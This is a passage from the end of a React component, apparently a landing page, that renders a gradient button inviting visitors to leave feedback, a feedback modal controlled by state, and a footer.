          <button className="px-7 py-3 bg-gradient-to-r from-[#a178ff] to-[#18fff6] text-[#16141b] font-bold rounded-xl shadow-lg hover:scale-105 transition mr-2 border-none" onClick={()=>setShowFeedback(true)}>
            Would you use this? Leave your opinion »
          </button>
        </div>
        <FeedbackModal open={showFeedback} onClose={()=>setShowFeedback(false)} />
        <Footer />
      </div>
    </div>
  );
}
